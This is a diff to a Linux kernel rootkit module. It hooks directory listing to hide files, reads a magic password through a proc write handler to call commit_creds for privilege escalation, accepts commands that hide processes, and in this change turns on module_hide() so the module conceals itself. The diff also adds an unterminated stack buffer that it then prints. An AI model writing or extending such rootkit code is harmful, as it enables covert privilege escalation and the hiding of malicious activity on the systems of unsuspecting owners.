@@ -5,6 +5,7 @@
 #include <linux/cred.h>
 #include <linux/fs.h>
 #include <linux/slab.h>
+#include <asm/uaccess.h>
 
 
 #define MIN(a,b) \
@@ -155,8 +156,8 @@ static int fs_filldir_new(void *ptr, const char *name, int namelen, loff_t offse
 static int fs_readdir_new(struct file *f, struct dir_context *d)
 {
 	int ret;
-	char* buf;
-	char* tmp;
+	//char* buf;
+	//char* tmp;
 	
 	struct dir_context dc = (struct dir_context) {
 		.actor = fs_filldir_new,
@@ -168,11 +169,13 @@ static int fs_readdir_new(struct file *f, struct dir_context *d)
 	fs_filldir_orig = d->actor;
 	memcpy((void*)d, (void*)&dc, sizeof(struct dir_context));
 
+#if 0
 	buf = (char*)kmalloc(4096, GFP_KERNEL);
 	tmp = d_path(&f->f_path, buf, 4096);
 	if (tmp)
 		printk("Path: %s\n", tmp);
 	kfree(buf);
+#endif
 
 
 	ret = fs_readdir_orig(f, d);
@@ -221,18 +224,24 @@ STATUS\n\
 
 	if (*off >= size) return 0;
   
-	memcpy(buffer, module_status, size);
+	copy_to_user(buffer, module_status, size);
 	*off = size;  
 	return size;
 }
 //static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
 
-static int rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *offset)
+static int rtkit_write(struct file *file, const char __user *buff2, size_t count, loff_t *offset)
 {
-	//printk("%s\n", buff);
+	char buff[1024];
+	if (count>=1024)
+		return count;
+
+	copy_from_user(buff, buff2, count); 
+
+	printk("%s\n", buff);
 	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
-	//	credentials->uid = credentials->euid = 0;
+		//credentials->uid = credentials->euid = 0;
 		//credentials->gid = credentials->egid = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
@@ -335,7 +344,7 @@ static int __init rootkit_init(void)
 		fs_clean();
 		return 1;
 	}
-//	module_hide();
+	module_hide();
 	//printk("rk loaded\n");		
 	
 	return 0;
